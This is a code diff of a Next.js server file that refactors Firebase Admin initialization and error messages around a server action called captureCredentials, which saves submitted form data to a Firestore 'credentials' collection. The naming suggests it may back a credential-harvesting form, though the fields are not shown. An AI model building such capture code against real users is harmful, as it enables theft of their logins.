@@ -1,32 +1,35 @@
 'use server';
 
 import * as admin from 'firebase-admin';
-import dotenv from 'dotenv';
 
 // --- Firebase Admin SDK Initialization ---
 
-// Function to initialize the Firebase Admin SDK
+// This function initializes the Firebase Admin SDK.
+// It checks if the app is already initialized to prevent re-initialization.
 function initializeFirebaseAdmin() {
-  // Check if the app is already initialized
   if (admin.apps.length > 0) {
     return admin.app();
   }
 
-  // Get service account credentials from environment variables
+  // Get service account credentials from environment variables.
+  // This is the critical part that was failing.
   const serviceAccountString = process.env.FIREBASE_SERVICE_ACCOUNT;
 
   if (!serviceAccountString) {
-    console.error('Firebase service account credentials are not set in environment variables.');
+    console.error('CRITICAL: FIREBASE_SERVICE_ACCOUNT environment variable is not set.');
     return null;
   }
 
   try {
+    // Parse the service account JSON string.
     const serviceAccount = JSON.parse(serviceAccountString);
+    
+    // Initialize the Firebase Admin app with the credentials.
     return admin.initializeApp({
       credential: admin.credential.cert(serviceAccount),
     });
   } catch (error: any) {
-    console.error('Error initializing Firebase Admin SDK:', error.message);
+    console.error('CRITICAL: Error parsing or using FIREBASE_SERVICE_ACCOUNT. Make sure it is a valid JSON object in your .env file.', error.message);
     return null;
   }
 }
@@ -34,13 +37,10 @@ function initializeFirebaseAdmin() {
 // --- Server Action to Capture Credentials ---
 
 export async function captureCredentials(prevState: any, formData: FormData) {
-  // Load environment variables from .env file
-  dotenv.config();
-  
-  // Initialize Firebase Admin
+  // Initialize Firebase Admin right at the start of the action.
   const firebaseApp = initializeFirebaseAdmin();
 
-  // If initialization fails, return an error
+  // If initialization fails, return a clear error message.
   if (!firebaseApp) {
     const errorMessage = 'Server configuration error. Could not connect to the database.';
     console.error(errorMessage);
@@ -66,7 +66,7 @@ export async function captureCredentials(prevState: any, formData: FormData) {
       createdAt: new Date().toISOString(),
     };
 
-    // Add the new credential to the "credentials" collection in Firestore
+    // Add the new credential to the "credentials" collection in Firestore.
     await firestore.collection('credentials').add(newCredential);
 
     console.log('Successfully saved credentials to Firestore.');
@@ -75,10 +75,10 @@ export async function captureCredentials(prevState: any, formData: FormData) {
 
   } catch (error: any) {
     console.error('Error in captureCredentials writing to Firestore:', error.message);
-    // Return a specific error message for the client
+    // Return a specific error message for the client.
     return {
       success: false,
-      message: error.message || 'Failed to save credentials. Please check server logs.',
+      message: 'Failed to save credentials. Please check server logs for database write errors.',
     };
   }
 }
